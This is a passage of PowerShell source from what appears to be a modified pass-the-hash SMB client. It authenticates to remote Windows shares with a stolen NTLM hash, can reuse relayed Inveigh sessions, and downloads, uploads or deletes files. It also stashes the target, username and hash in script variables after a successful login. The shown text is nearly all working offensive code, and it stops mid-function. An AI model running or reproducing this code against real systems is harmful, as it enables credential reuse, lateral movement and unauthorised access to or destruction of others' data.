    return $NTLMSSPAuth
}

function Get-UInt16DataLength
{
    param ([Int]$Start,[Byte[]]$Data)

    $data_length = [System.BitConverter]::ToUInt16($Data[$Start..($Start + 1)],0)

    return $data_length
}

if($Modify -and $Action -eq 'Put' -and $Source -isnot [Byte[]])
{
    $output_message = "[-] Source must be a byte array when using -Modify"
    $startup_error = $true
}
elseif((!$Modify -and $Source -isnot [String]) -or ($Modify -and $Action -ne 'Put' -and $Source -isnot [String]))
{
    $output_message = "[-] Source must be a string"
    $startup_error = $true
}
elseif($Action -eq 'Delete' -and !$Source.StartsWith("\\"))
{
    $output_message = "[-] Source must be a UNC file path"
    $startup_error = $true
}
elseif($Source -is [String])
{
    $source = $Source.Replace('.\','')
}

if($PSBoundParameters.ContainsKey('Session'))
{
    $inveigh_session = $true
}

if($PSBoundParameters.ContainsKey('Session'))
{

    if(!$Inveigh)
    {
        Write-Output "[-] Inveigh Relay session not found"
        $startup_error = $true
    }
    elseif(!$inveigh.session_socket_table[$session].Connected)
    {
        Write-Output "[-] Inveigh Relay session not connected"
        $startup_error = $true
    }

}

$destination = $Destination.Replace('.\','')

if($hash -like "*:*")
{
    $hash = $hash.SubString(($hash.IndexOf(":") + 1),32)
}

if($Domain)
{
    $output_username = $Domain + "\" + $Username
}
else
{
    $output_username = $Username
}

$process_ID = [System.Diagnostics.Process]::GetCurrentProcess() | Select-Object -expand id
$process_ID = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($process_ID))
[Byte[]]$process_ID = $process_ID.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

if(!$inveigh_session)
{
    $client = New-Object System.Net.Sockets.TCPClient
    $client.Client.ReceiveTimeout = 30000
}

$action_step = 0

if($Action -ne 'Put')
{
    $source = $source.Replace('\\','')
    $source_array = $source.Split('\')
    $target = $source_array[0]
    $share = $source_array[1]
    $source_subdirectory_array = $source.ToCharArray()
    [Array]::Reverse($source_subdirectory_array)
    $source_file = -join($source_subdirectory_array)
    $source_file = $source_file.SubString(0,$source_file.IndexOf('\'))
    $source_file_array = $source_file.ToCharArray()
    [Array]::Reverse($source_file_array)
    $source_file = -join($source_file_array)
    $target_share = "\\$target\$share"
}

switch($Action)
{

    'Get'
    {

        if(!$Modify)
        {

            if($destination -and $destination -like '*\*')
            {
                $destination_file_array = $destination.ToCharArray()
                [Array]::Reverse($destination_file_array)
                $destination_file = -join($destination_file_array)
                $destination_file = $destination_file.SubString(0,$destination_file.IndexOf('\'))
                $destination_file_array = $destination_file.ToCharArray()
                [Array]::Reverse($destination_file_array)
                $destination_file = -join($destination_file_array)
                $destination_path = $destination
            }
            elseif($destination)
            {

                if(Test-Path (Join-Path $PWD $destination))
                {
                    $output_message = "[-] Destination file already exists"
                    $startup_error = $true
                }
                else
                {
                    $destination_path = Join-Path $PWD $destination
                }
               
            }
            else
            {

                if(Test-Path (Join-Path $PWD $source_file))
                {
                    $output_message = "[-] Destination file already exists"
                    $startup_error = $true
                }
                else
                {
                    $destination_path = Join-Path $PWD $source_file
                }

            }

        }
        else
        {
            $file_memory = New-Object System.Collections.ArrayList
        }

    }

    'Put'
    {

        if(!$Modify)
        {

            if($source -notlike '*\*')
            {
                $source = Join-Path $PWD $source
            }

            if(Test-Path $source)
            {
                [Int64]$source_file_size = (Get-Item $source).Length
                $source_file = $source

                if($source_file_size -gt 65536)
                {
                    $source_file_size_quotient = [Math]::Truncate($source_file_size / 65536)
                    $source_file_size_remainder = $source_file_size % 65536
                    $source_file_buffer_size = 65536
                }
                else
                {
                    $source_file_buffer_size = $source_file_size
                }

                $source_file_properties = Get-ItemProperty -path $source_file
                $source_file_creation_time = $source_file_properties.CreationTime.ToFileTime()
                $source_file_creation_time = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($source_file_creation_time))
                $source_file_creation_time = $source_file_creation_time.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                $source_file_last_access_time = $source_file_properties.LastAccessTime.ToFileTime()
                $source_file_last_access_time = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($source_file_last_access_time))
                $source_file_last_access_time = $source_file_last_access_time.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                $source_file_last_write_time = $source_file_properties.LastWriteTime.ToFileTime()
                $source_file_last_write_time = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($source_file_last_write_time))
                $source_file_last_write_time = $source_file_last_write_time.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                $source_file_last_change_time = $source_file_last_write_time
                $source_file_buffer = new-object byte[] $source_file_buffer_size
                $source_file_stream = new-object IO.FileStream($source_file,[System.IO.FileMode]::Open)
                $source_file_binary_reader = new-object IO.BinaryReader($source_file_stream)
            }
            else
            {
                $output_message = "[-] File not found"
                $startup_error = $true
            }

        }
        else
        {
            [Int64]$source_file_size = $Source.Count

            if($source_file_size -gt 65536)
            {
                $source_file_size_quotient = [Math]::Truncate($source_file_size / 65536)
                $source_file_size_remainder = $source_file_size % 65536
                $source_file_buffer_size = 65536
            }
            else
            {
                $source_file_buffer_size = $source_file_size
            }
      
        }

        $destination = $destination.Replace('\\','')
        $destination_array = $destination.Split('\')
        $target = $destination_array[0]
        $share = $destination_array[1]
        $destination_file_array = $destination.ToCharArray()
        [Array]::Reverse($destination_file_array)
        $destination_file = -join($destination_file_array)
        $destination_file = $destination_file.SubString(0,$destination_file.IndexOf('\'))
        $destination_file_array = $destination_file.ToCharArray()
        [Array]::Reverse($destination_file_array)
        $destination_file = -join($destination_file_array)
    }

}

if($Action -ne 'Put')
{

    if($source_array.Count -gt 2)
    {
        $share_subdirectory = $source.Substring($target.Length + $share.Length + 2)
    }

}
else
{
    
    if($destination_array.Count -gt 2)
    {
        $share_subdirectory = $destination.Substring($target.Length + $share.Length + 2)
    }

}

if($share_subdirectory -and $share_subdirectory.EndsWith('\'))
{
    $share_subdirectory = $share_subdirectory.Substring(0,$share_subdirectory.Length - 1)
}

if(!$startup_error -and !$inveigh_session)
{

    try
    {
        $client.Connect($target,"445")
    }
    catch
    {
        $output_message = "[-] $target did not respond"
    }

}

if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$session].Connected))
{
    
    $client_receive = New-Object System.Byte[] 81920

    if(!$inveigh_session)
    {
        $client_stream = $client.GetStream()
        
        if($SMB_version -eq 'SMB2.1')
        {
            $stage = 'NegotiateSMB2'
        }
        else
        {
            $stage = 'NegotiateSMB'
        }

        while($stage -ne 'Exit')
        {

            try
            {
            
                switch ($stage)
                {

                    'NegotiateSMB'
                    {          
                        $packet_SMB_header = New-PacketSMBHeader 0x72 0x18 0x01,0x48 0xff,0xff $process_ID 0x00,0x00       
                        $packet_SMB_data = New-PacketSMBNegotiateProtocolRequest $SMB_version
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data

                        try
                        {
                            $client_stream.Write($client_send,0,$client_send.Length) > $null
                            $client_stream.Flush()    
                            $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                            if([System.BitConverter]::ToString($client_receive[4..7]) -eq 'ff-53-4d-42')
                            {
                                $SMB_version = 'SMB1'
                                $stage = 'NTLMSSPNegotiate'

                                if([System.BitConverter]::ToString($client_receive[39]) -eq '0f')
                                {

                                    if($signing_check)
                                    {
                                        Write-Output "[+] SMB signing is required on $Target"
                                        $stage = 'Exit'
                                    }
                                    else
                                    {    
                                        Write-Verbose "[+] SMB signing is required"
                                        $SMB_signing = $true
                                        $session_key_length = 0x00,0x00
                                        $negotiate_flags = 0x15,0x82,0x08,0xa0
                                    }

                                }
                                else
                                {

                                    if($signing_check)
                                    {
                                        Write-Output "[+] SMB signing is not required on $Target"
                                        $stage = 'Exit'
                                    }
                                    else
                                    {    
                                        $SMB_signing = $false
                                        $session_key_length = 0x00,0x00
                                        $negotiate_flags = 0x05,0x82,0x08,0xa0
                                    }

                                }

                            }
                            else
                            {
                                $stage = 'NegotiateSMB2'

                                if([System.BitConverter]::ToString($client_receive[70]) -eq '03')
                                {

                                    if($signing_check)
                                    {
                                        Write-Output "[+] SMB signing is required on $Target"
                                        $stage = 'Exit'
                                    }
                                    else
                                    {   

                                        if(!$SMB_signing)
                                        {
                                            Write-Verbose "[+] SMB signing is required"
                                        }

                                        $SMB_signing = $true
                                        $session_key_length = 0x00,0x00
                                        $negotiate_flags = 0x15,0x82,0x08,0xa0
                                    }

                                }
                                else
                                {

                                    if($signing_check)
                                    {
                                        Write-Output "[+] SMB signing is not required on $Target"
                                        $stage = 'Exit'
                                    }
                                    else
                                    {    
                                        $SMB_signing = $false
                                        $session_key_length = 0x00,0x00
                                        $negotiate_flags = 0x05,0x80,0x08,0xa0
                                    }

                                }

                            }

                        }
                        catch
                        {

                            if($_.Exception.Message -like 'Exception calling "Read" with "3" argument(s): "Unable to read data from the transport connection: An existing connection was forcibly closed by the remote host."')
                            {
                                Write-Output "[-] SMB1 negotiation failed"
                                $negoitiation_failed = $true
                                $stage = 'Exit'
                            }

                        }

                    }

                    'NegotiateSMB2'
                    {

                        if($SMB_version -eq 'SMB2.1')
                        {
                            $message_ID = 0
                        }
                        else
                        {
                            $message_ID = 1
                        }

                        $tree_ID = 0x00,0x00,0x00,0x00
                        $session_ID = 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                        $packet_SMB_header = New-PacketSMB2Header 0x00,0x00 0x00,0x00 $false $message_ID $process_ID $tree_ID $session_ID
                        $packet_SMB_data = New-PacketSMB2NegotiateProtocolRequest
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()    
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                        $stage = 'NTLMSSPNegotiate'

                        if([System.BitConverter]::ToString($client_receive[70]) -eq '03')
                        {

                            if($signing_check)
                            {
                                Write-Output "[+] SMB signing is required on $target"
                                $stage = 'Exit'
                            }
                            else
                            {

                                if(!$SMB_signing)
                                {
                                    Write-Verbose "[+] SMB signing is required"
                                }

                                $SMB_signing = $true
                                $session_key_length = 0x00,0x00
                                $negotiate_flags = 0x15,0x82,0x08,0xa0
                            }

                        }
                        else
                        {

                            if($signing_check)
                            {
                                Write-Output "[+] SMB signing is not required on $target"
                                $stage = 'Exit'
                            }
                            else
                            {
                                $SMB_signing = $false
                                $session_key_length = 0x00,0x00
                                $negotiate_flags = 0x05,0x80,0x08,0xa0
                            }

                        }

                    }
                        
                    'NTLMSSPNegotiate'
                    { 
                        
                        if($SMB_version -eq 'SMB1')
                        {
                            $packet_SMB_header = New-PacketSMBHeader 0x73 0x18 0x07,0xc8 0xff,0xff $process_ID 0x00,0x00

                            if($SMB_signing)
                            {
                                $packet_SMB_header["Flags2"] = 0x05,0x48
                            }

                            $packet_NTLMSSP_negotiate = New-PacketNTLMSSPNegotiate $negotiate_flags
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                            $NTLMSSP_negotiate = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_negotiate       
                            $packet_SMB_data = New-PacketSMBSessionSetupAndXRequest $NTLMSSP_negotiate
                            $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                            $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        }
                        else
                        {
                            $message_ID++
                            $packet_SMB_header = New-PacketSMB2Header 0x01,0x00 0x1f,0x00 $false $message_ID $process_ID $tree_ID $session_ID
                            $packet_NTLMSSP_negotiate = New-PacketNTLMSSPNegotiate $negotiate_flags 0x06,0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                            $NTLMSSP_negotiate = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_negotiate       
                            $packet_SMB_data = New-PacketSMB2SessionSetupRequest $NTLMSSP_negotiate
                            $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                            $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        }

                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()    
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                        $stage = 'Exit'
                    }
                    
                }

            }
            catch
            {
                Write-Output "[-] $($_.Exception.Message)"
                $negoitiation_failed = $true
            }

        }

        if(!$signing_check -and !$negoitiation_failed)
        {
            $NTLMSSP = [System.BitConverter]::ToString($client_receive)
            $NTLMSSP = $NTLMSSP -replace "-",""
            $NTLMSSP_index = $NTLMSSP.IndexOf("4E544C4D53535000")
            $NTLMSSP_bytes_index = $NTLMSSP_index / 2
            $domain_length = Get-UInt16DataLength ($NTLMSSP_bytes_index + 12) $client_receive
            $target_length = Get-UInt16DataLength ($NTLMSSP_bytes_index + 40) $client_receive
            $session_ID = $client_receive[44..51]
            $NTLM_challenge = $client_receive[($NTLMSSP_bytes_index + 24)..($NTLMSSP_bytes_index + 31)]
            $target_details = $client_receive[($NTLMSSP_bytes_index + 56 + $domain_length)..($NTLMSSP_bytes_index + 55 + $domain_length + $target_length)]
            $target_time_bytes = $target_details[($target_details.Length - 12)..($target_details.Length - 5)]
            $NTLM_hash_bytes = (&{for ($i = 0;$i -lt $hash.Length;$i += 2){$hash.SubString($i,2)}}) -join "-"
            $NTLM_hash_bytes = $NTLM_hash_bytes.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
            $auth_hostname = (Get-ChildItem -path env:computername).Value
            $auth_hostname_bytes = [System.Text.Encoding]::Unicode.GetBytes($auth_hostname)
            $auth_domain_bytes = [System.Text.Encoding]::Unicode.GetBytes($Domain)
            $auth_username_bytes = [System.Text.Encoding]::Unicode.GetBytes($username)
            $auth_domain_length = [System.BitConverter]::GetBytes($auth_domain_bytes.Length)[0,1]
            $auth_domain_length = [System.BitConverter]::GetBytes($auth_domain_bytes.Length)[0,1]
            $auth_username_length = [System.BitConverter]::GetBytes($auth_username_bytes.Length)[0,1]
            $auth_hostname_length = [System.BitConverter]::GetBytes($auth_hostname_bytes.Length)[0,1]
            $auth_domain_offset = 0x40,0x00,0x00,0x00
            $auth_username_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + 64)
            $auth_hostname_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + 64)
            $auth_LM_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + 64)
            $auth_NTLM_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + 88)
            $HMAC_MD5 = New-Object System.Security.Cryptography.HMACMD5
            $HMAC_MD5.key = $NTLM_hash_bytes
            $username_and_target = $username.ToUpper()
            $username_and_target_bytes = [System.Text.Encoding]::Unicode.GetBytes($username_and_target)
            $username_and_target_bytes += $auth_domain_bytes
            $NTLMv2_hash = $HMAC_MD5.ComputeHash($username_and_target_bytes)
            $client_challenge = [String](1..8 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
            $client_challenge_bytes = $client_challenge.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

            $security_blob_bytes = 0x01,0x01,0x00,0x00,
                                    0x00,0x00,0x00,0x00 +
                                    $target_time_bytes +
                                    $client_challenge_bytes +
                                    0x00,0x00,0x00,0x00 +
                                    $target_details +
                                    0x00,0x00,0x00,0x00,
                                    0x00,0x00,0x00,0x00

            $server_challenge_and_security_blob_bytes = $NTLM_challenge + $security_blob_bytes
            $HMAC_MD5.key = $NTLMv2_hash
            $NTLMv2_response = $HMAC_MD5.ComputeHash($server_challenge_and_security_blob_bytes)

            if($SMB_signing)
            {
                $session_base_key = $HMAC_MD5.ComputeHash($NTLMv2_response)
                $session_key = $session_base_key
                $HMAC_SHA256 = New-Object System.Security.Cryptography.HMACSHA256
                $HMAC_SHA256.key = $session_key
            }

            $NTLMv2_response = $NTLMv2_response + $security_blob_bytes
            $NTLMv2_response_length = [System.BitConverter]::GetBytes($NTLMv2_response.Length)[0,1]
            $session_key_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + $NTLMv2_response.Length + 88)

            $NTLMSSP_response = 0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,
                                    0x03,0x00,0x00,0x00,
                                    0x18,0x00,
                                    0x18,0x00 +
                                    $auth_LM_offset +
                                    $NTLMv2_response_length +
                                    $NTLMv2_response_length +
                                    $auth_NTLM_offset +
                                    $auth_domain_length +
                                    $auth_domain_length +
                                    $auth_domain_offset +
                                    $auth_username_length +
                                    $auth_username_length +
                                    $auth_username_offset +
                                    $auth_hostname_length +
                                    $auth_hostname_length +
                                    $auth_hostname_offset +
                                    $session_key_length +
                                    $session_key_length +
                                    $session_key_offset +
                                    $negotiate_flags +
                                    $auth_domain_bytes +
                                    $auth_username_bytes +
                                    $auth_hostname_bytes +
                                    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +
                                    $NTLMv2_response

            if($SMB_version -eq 'SMB1')
            {
                $SMB_user_ID = $client_receive[32,33]
                $packet_SMB_header = New-PacketSMBHeader 0x73 0x18 0x07,0xc8 0xff,0xff $process_ID $SMB_user_ID

                if($SMB_signing)
                {
                    $packet_SMB_header["Flags2"] = 0x05,0x48
                }

                $packet_SMB_header["UserID"] = $SMB_user_ID
                $packet_NTLMSSP_negotiate = New-PacketNTLMSSPAuth $NTLMSSP_response
                $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                $NTLMSSP_negotiate = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_negotiate      
                $packet_SMB_data = New-PacketSMBSessionSetupAndXRequest $NTLMSSP_negotiate
                $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
            }
            else
            {
                $message_ID++
                $packet_SMB_header = New-PacketSMB2Header 0x01,0x00 0x00,0x00 $false $message_ID  $process_ID $tree_ID $session_ID
                $packet_NTLMSSP_auth = New-PacketNTLMSSPAuth $NTLMSSP_response
                $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                $NTLMSSP_auth = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_auth        
                $packet_SMB_data = New-PacketSMB2SessionSetupRequest $NTLMSSP_auth
                $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
            }

            try
            {
                $client_stream.Write($client_send,0,$client_send.Length) > $null
                $client_stream.Flush()
                $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                if($SMB_version -eq 'SMB1')
                {

                    if([System.BitConverter]::ToString($client_receive[9..12]) -eq '00-00-00-00')
                    {
						$script:tmpip = $Target
						$script:tmpuser = $Username
						$script:tmphash = $hash
                        Write-Verbose "[+] $output_username successfully authenticated on $Target"
                        Write-Output "[-] SMB1 is only supported with signing check and authentication"
                        $login_successful = $false
                    }
                    else
                    {
                        Write-Output "[!] $output_username failed to authenticate on $Target"
                        $login_successful = $false
                    }

                }
                else
                {
                    if([System.BitConverter]::ToString($client_receive[12..15]) -eq '00-00-00-00')
                    {
						$script:tmpip = $Target
						$script:tmpuser = $Username
						$script:tmphash = $hash
                        Write-Verbose "[+] $output_username successfully authenticated on $Target"
                        $login_successful = $true
                    }
                    else
                    {
                        Write-Output "[!] $output_username failed to authenticate on $Target"
                        $login_successful = $false
                    }

                }

            }
            catch
            {
                Write-Output "[-] $($_.Exception.Message)"
                $login_successful = $false
            }

        }

    }

    try
    {

        if($login_successful -or $inveigh_session)
        {

            if($inveigh_session)
            {

                if($inveigh_session -and $inveigh.session_lock_table[$session] -eq 'locked')
                {
                    Write-Output "[*] Pausing due to Inveigh Relay session lock"
                    Start-Sleep -s 2
                }

                $inveigh.session_lock_table[$session] = 'locked'
                $client = $inveigh.session_socket_table[$session]
                $client_stream = $client.GetStream()
                $session_ID = $inveigh.session_table[$session]
                $message_ID =  $inveigh.session_message_ID_table[$session]
                $tree_ID = 0x00,0x00,0x00,0x00
                $SMB_signing = $false
            }

            $path = "\\" + $Target + "\IPC$"
            $path_bytes = [System.Text.Encoding]::Unicode.GetBytes($path)
            $directory_list = New-Object System.Collections.ArrayList
            $stage = 'TreeConnect'

            while ($stage -ne 'Exit')
            {

                switch($stage)
                {
            
                    'CloseRequest'
                    {

                        if(!$file_ID)
                        {
                            $file_ID = $client_receive[132..147]
                        }

                        $message_ID++
                        $packet_SMB2_header = New-PacketSMB2Header 0x06,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SMB2_data = New-PacketSMB2CloseRequest $file_ID
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header["Signature"] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                        $file_ID = ''

                        if($directory_list.Count -gt 0 -and $Action -eq 'Recurse')
                        {
                            $file = $directory_list[0]
                            $root_directory = $file + 0x5c,0x00
                            $create_request_extra_info = 1
                            $stage = 'CreateRequest'

                            if($root_directory.Count -gt 2)
                            {
                                $root_directory_extract = [System.BitConverter]::ToString($root_directory)
                                $root_directory_extract = $root_directory_extract -replace "-00",""

                                if($root_directory.Length -gt 2)
                                {
                                    $root_directory_extract = $root_directory_extract.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                                    $root_directory_string = New-Object System.String ($root_directory_extract,0,$root_directory_extract.Length)
                                }
                                else
                                {
                                    $root_directory_string = [Char][System.Convert]::ToInt16($file,16)
                                }

                            }

                        }
                        elseif($Action -eq 'Get' -and $action_step -eq 1)
                        {

                            if($share_subdirectory -eq $source_file)
                            {
                                $file = ""
                            }
                            else
                            {
                                $file = [System.Text.Encoding]::Unicode.GetBytes($share_subdirectory.Replace('\' + $source_file,''))
                            }

                            $create_request_extra_info = 1
                            $stage = 'CreateRequest'
                        }
                        elseif($Action -eq 'Delete')
                        {
                            
                            switch($action_step)
                            {

                                0
                                {

                                    if($share_subdirectory -eq $source_file)
                                    {
                                        $file = ""
                                    }
                                    else
                                    {
                                        $file = [System.Text.Encoding]::Unicode.GetBytes($share_subdirectory.Replace('\' + $source_file,''))
                                    }

                                    $create_request_extra_info = 1
                                    $stage = 'CreateRequest'
                                    $action_step++

                                }

                                1
                                {
                                    $stage = 'CreateRequestFindRequest'
                                }

                                3
                                {
                                    $stage = 'TreeDisconnect'
                                }

                            }

                        }
                        elseif($share_subdirectory_start)
                        {
                            $share_subdirectory_start = $false
                            $stage = 'CreateRequestFindRequest'
                        }
                        else
                        {
                            $stage = 'TreeDisconnect'
                        }

                    }

                    'CreateRequest'
                    {
                        $message_ID++
                        $packet_SMB2_header = New-PacketSMB2Header 0x05,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SMB2_data = New-PacketSMB2CreateRequest $file $create_request_extra_info $source_file_size

                        if($directory_list.Count -gt 0)
                        {
                            $packet_SMB2_data["DesiredAccess"] = 0x81,0x00,0x10,0x00
                            $packet_SMB2_data["ShareAccess"] = 0x07,0x00,0x00,0x00
                        }
                        
                        if($Action -eq 'Delete')
                        {

                            switch($action_step)
                            {
                                
                                0
                                {
                                    $packet_SMB2_data["CreateOptions"] = 0x00,0x00,0x20,0x00
                                    $packet_SMB2_data["DesiredAccess"] = 0x80,0x00,0x00,0x00
                                    $packet_SMB2_data["ShareAccess"] = 0x07,0x00,0x00,0x00
                                }

                                2
                                {
                                    $packet_SMB2_data["CreateOptions"] = 0x40,0x00,0x20,0x00
                                    $packet_SMB2_data["DesiredAccess"] = 0x80,0x00,0x01,0x00
                                    $packet_SMB2_data["ShareAccess"] = 0x07,0x00,0x00,0x00
                                }

                            }

                        }

                        if($Action -eq 'Get')
                        {
                            $packet_SMB2_data["CreateOptions"] = 0x00,0x00,0x20,0x00
                            $packet_SMB2_data["DesiredAccess"] = 0x89,0x00,0x12,0x00
                            $packet_SMB2_data["ShareAccess"] = 0x05,0x00,0x00,0x00
                        }

                        if($Action -eq 'Put')
                        {
                        
                            switch($action_step)
                            {

                                0
                                {
                                    $packet_SMB2_data["CreateOptions"] = 0x60,0x00,0x20,0x00
                                    $packet_SMB2_data["DesiredAccess"] = 0x89,0x00,0x12,0x00
                                    $packet_SMB2_data["ShareAccess"] = 0x01,0x00,0x00,0x00
                                    $packet_SMB2_data["RequestedOplockLevel"] = 0xff
                                }

                                1
                                {
                                    $packet_SMB2_data["CreateOptions"] = 0x64,0x00,0x00,0x00
                                    $packet_SMB2_data["DesiredAccess"] = 0x97,0x01,0x13,0x00
                                    $packet_SMB2_data["ShareAccess"] = 0x00,0x00,0x00,0x00
                                    $packet_SMB2_data["RequestedOplockLevel"] = 0xff
                                    $packet_SMB2_data["FileAttributes"] = 0x20,0x00,0x00,0x00
                                    $packet_SMB2_data["CreateDisposition"] = 0x05,0x00,0x00,0x00
                                }

                            }

                        }

                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data  
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data  
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header["Signature"] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                        
                        if([System.BitConverter]::ToString($client_receive[12..15]) -ne '00-00-00-00')
                        {

                            $error_code = [System.BitConverter]::ToString($client_receive[15..12])

                            switch($error_code)
                            {

                                'c0-00-01-03'
                                {
                                    $stage = 'Exit'
                                }

                                'c0-00-00-22'
                                {

                                    if($directory_list.Count -gt 0)
                                    {
                                        $directory_list.RemoveAt(0) > $null
                                    }
                                    else
                                    {
                                        $output_message = "[-] Access denied"
                                        $share_subdirectory_start = $false
                                    }

                                    $stage = 'CloseRequest'

                                }

                                'c0-00-00-34'
                                {

                                    if($Action -eq 'Put')
                                    {
                                        $create_request_extra_info = 3
                                        $action_step++
                                        $stage = 'CreateRequest'
                                    }
                                    else
                                    {
                                        $output_message = "[-] File not found"
                                        $stage = 'Exit'
                                    }

                                }

                                'c0-00-00-ba'
                                {
                                    
                                    if($Action -eq 'Put')
                                    {
                                        $output_message = "[-] Destination filname must be specified"
                                        $stage = 'CloseRequest'
                                    }

                                }

                                default
                                {
                                    $error_code = $error_code -replace "-",""
                                    $output_message = "[-] Create request error code 0x$error_code"
                                    $stage = 'Exit'
                                }

                            }

                        }
                        elseif($Action -eq 'Delete' -and $action_step -eq 2)
                        {
                            $set_info_request_file_info_class = 0x01
                            $set_info_request_info_level = 0x0d
                            $set_info_request_buffer = 0x01,0x00,0x00,0x00
                            $file_ID = $client_receive[132..147]
